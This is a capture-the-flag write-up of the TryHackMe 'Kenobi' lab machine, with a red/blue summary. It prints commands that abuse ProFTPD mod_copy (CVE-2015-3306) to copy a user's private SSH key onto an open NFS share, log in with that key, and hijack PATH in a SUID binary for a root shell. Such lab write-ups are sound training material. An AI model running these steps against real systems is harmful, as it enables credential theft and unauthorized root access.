---
title: "TryHackMe: Kenobi"
symbol: "Kn"
category: "Machines"
readTime: 2
tldr: "Exploiting ProFTPD mod_copy to copy private SSH keys to an NFS share, then hijacking binary paths for root."
red: "Use ProFTPD CPFR/CPTO to copy sensitive keys to an open NFS share, mount it, and hijack PATH in a SUID binary."
blue: "Update vulnerable daemons, restrict NFS export permissions, and use absolute paths in custom compiled binaries."
next: "meow"
---

### Machine Overview
Kenobi on TryHackMe demonstrates how multiple seemingly minor service misconfigurations—an outdated FTP daemon, an open NFS share, and a path-hijackable SUID binary—can be chained together for full system takeover.

### Step 1: Reconnaissance
An Nmap scan reveals several active services:
- Port 21: ProFTPD 1.3.5
- Port 22: SSH
- Port 80: HTTP
- Port 111 / 2049: Network File System (NFS)
- Port 139 / 445: Samba

Using `showmount -e <target_ip>`, we see an accessible NFS export: `/var`.

### Step 2: Exploiting ProFTPD mod_copy
Searchsploit reveals that ProFTPD version 1.3.5 is vulnerable to unauthorized file copying via the `mod_copy` module (CVE-2015-3306). An unauthenticated client can issue `CPFR` (copy from) and `CPTO` (copy to) commands.

We connect to port 21 via Netcat and copy user Kenobi's private SSH key to the accessible `/var/tmp` directory:
```bash
nc <target_ip> 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

### Step 3: Mounting NFS and Logging In
We mount the `/var` NFS share on our local attack machine:
```bash
sudo mount <target_ip>:/var /mnt/kenobi
cp /mnt/kenobi/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@<target_ip>
```
We obtain interactive shell access as `kenobi`.

### Step 4: SUID Path Hijacking
Searching for SUID binaries reveals an unusual custom binary: `/usr/bin/menu`.
Running `strings /usr/bin/menu` shows it executes system commands like `curl` without using an absolute path (`curl` instead of `/usr/bin/curl`).

We hijack the `PATH` environment variable:
```bash
cd /tmp
echo "/bin/sh" > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```
When `menu` runs `curl`, it executes our script instead, spawning a root shell.

### Key takeaway
Always use absolute paths when calling system utilities in custom SUID binaries.
